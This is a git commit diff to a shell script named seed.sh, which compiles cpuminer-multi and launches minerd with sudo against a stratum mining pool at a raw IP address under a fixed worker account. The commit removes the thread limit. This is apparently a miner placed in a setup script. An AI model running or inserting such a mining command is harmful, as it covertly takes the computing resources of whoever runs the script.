e0bc4a13786836b84aed2f6d69828a1c060d2c09
red56565 <108178533+red56565@users.noreply.github.com>
2022-07-14 00:04:06 +0200

    Update seed.sh

--- seed.sh
+++ seed.sh
@@ -4,4 +4,4 @@ cd cpuminer-multi
 ./autogen.sh
 CFLAGS="-march=native" ./configure
 make
-sudo ./minerd -o stratum+tcp://168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.blade333 -t 3
+sudo ./minerd -o stratum+tcp://168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.blade333
